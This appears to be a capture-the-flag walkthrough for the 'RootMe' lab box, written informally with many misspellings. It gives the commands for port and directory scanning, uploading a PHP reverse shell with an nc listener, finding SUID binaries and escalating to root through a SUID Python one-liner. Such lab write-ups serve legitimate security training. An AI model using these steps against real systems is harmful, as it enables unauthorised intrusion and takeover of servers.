@@ -1,0 +1,79 @@
+###### To Solve  ROOTME
+
+1) run nmap scaning 
+
+              [nmap -sC -sV IP] or [nmap -sC -sV -p- IP]
+
+  ===> then we will fing thE:- opening ports
+                               and apache version N more info about it
+
+2) we need to use gobaster for bruit force directory scan
+       
+       [sudogobuster dir -u http://IP/ -w /usr/share/wordlists/dirb/common.t        xt] 
+
+       * then we will find allot of directory like: - panel,
+       and also 'panel is hiden direcctory = /panel/
+
+ ==> next  we need to go back on brewser and :-
+                  http://IP/panel/ Go---> Search
+
+        BOOM! we found  'Select file and upload' page
+    SOOO! now we need reverse shell , go head N SEARCH
+        
+        'https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-         reverse-shell.php'
+    
+
+    And then download it and modify your machine IP and port
+    then ,  before you upload it 
+     create lestiner tab to activate you shell
+      
+         [nc -lvp 1234]
+
+  and then try to upload it if you find error just change directory and 
+    modify "filename.php5"
+
+    And after you uploaded the file 
+     go to berowser and look for:-
+                 =http://IP/panel/upload/
+
+        then now click on php file you ave alredy uploaded,
+
+        then check your  lestiner comman line,
+    you will get into shell
+
+  -----------------on shell
+
+        [whoami]
+
+        [ls]
+
+        [find / -name user.txt]
+
+        [cat /var/www/user.txt]
+
+        [find / -user root -perm /4000 2>/dev/null]
+
+= = =>weired file will be "/usr/bin/python" Answer
+        
+        [/usr/bin/./python -c 'import os;os.execl("/bin/sh","sh","-p")']
+
+
+        [whoami]
+
+        [cd root]
+
+        [ls]
+        
+        [cat root.txt]
+
+finaly you will find the last flag
+
+
+DONE!
+
+
+
+
+
+
+
